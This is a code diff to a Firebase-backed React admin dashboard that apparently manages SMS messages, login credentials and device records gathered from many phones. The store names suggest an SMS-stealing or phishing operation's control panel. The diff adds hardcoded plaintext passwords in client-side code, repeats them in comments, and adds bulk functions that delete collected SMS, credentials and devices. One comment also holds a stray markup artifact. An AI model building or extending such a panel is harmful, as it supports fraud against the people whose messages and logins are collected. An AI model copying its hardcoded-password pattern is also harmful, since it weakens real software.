@@ -10,7 +10,11 @@ import BackupPanel from "../components/BackupPanel";
 import AnalyticsPanel from "../components/AnalyticsPanel";
 import AllDevicesSmsPanel from "../components/AllDevicesSmsPanel";
 
-const ADMIN_PASSWORD = "9090";
+// PASSWORDS CONFIGURATION
+const ADMIN_PASSWORD = "9090";          // Screen Unlock Password[span_4](start_span)[span_4](end_span)
+const DELETE_SMS_PASSWORD = "1122";      // SMS Delete Password
+const DELETE_CRED_PASSWORD = "3344";     // Credentials Delete Password
+const DELETE_DEVICES_PASSWORD = "5566";  // Devices Delete Password
 
 export default function AdminDashboard() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -87,7 +91,6 @@ export default function AdminDashboard() {
     localStorage.setItem("rtoFavourites", JSON.stringify(next));
   };
 
-  // Realtime Firebase Live Status Listener
   useEffect(() => {
     if (!isAuthenticated) return;
 
@@ -141,18 +144,36 @@ export default function AdminDashboard() {
     return () => unsubscribe();
   }, [isAuthenticated]);
 
+  // DELETE ALL SMS - Password: 1122
   const deleteAllSms = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL SMS:");
-    if (pwd !== ADMIN_PASSWORD) return showToast("❌ Invalid Password", "error");
+    if (pwd !== DELETE_SMS_PASSWORD) return showToast("❌ Invalid Password for SMS deletion", "error");
     if (!confirm("Are you sure you want to delete ALL SMS?")) return;
     remove(ref(db, "user_sms")).then(() => showToast("✅ All SMS Deleted", "success"));
   };
 
+  // DELETE ALL CREDENTIALS - Password: 3344
   const deleteAllCredentials = () => {
     const pwd = prompt("🔐 Enter Password to Delete ALL Credentials:");
-    if (pwd !== ADMIN_PASSWORD) return showToast("❌ Invalid Password", "error");
+    if (pwd !== DELETE_CRED_PASSWORD) return showToast("❌ Invalid Password for Credential deletion", "error");
     if (!confirm("Delete ALL credentials?")) return;
     remove(ref(db, "login")).then(() => showToast("✅ All Credentials Deleted", "success"));
+  };
+
+  // DELETE ALL DEVICES - Password: 5566
+  const deleteAllDevices = () => {
+    const pwd = prompt("🔐 Enter Password to Delete ALL DEVICES:");
+    if (pwd !== DELETE_DEVICES_PASSWORD) return showToast("❌ Invalid Password for Devices deletion", "error");
+    if (!confirm("⚠️ WARNING: Are you sure you want to delete ALL registered devices?")) return;
+
+    Promise.all([
+      remove(ref(db, "user_data")),
+      remove(ref(db, "device_status"))
+    ]).then(() => {
+      showToast("✅ All Devices Removed Successfully", "success");
+    }).catch(() => {
+      showToast("❌ Failed to delete devices", "error");
+    });
   };
 
   const totalSmsCount = Object.values(data.user_sms || {}).reduce(
@@ -311,6 +332,7 @@ export default function AdminDashboard() {
               openSmsModal={(id) => setSmsModalDevice(id)}
               deleteAllSms={deleteAllSms}
               deleteAllCredentials={deleteAllCredentials}
+              deleteAllDevices={deleteAllDevices}
             />
           )}
           {activePanel === "favourites" && (
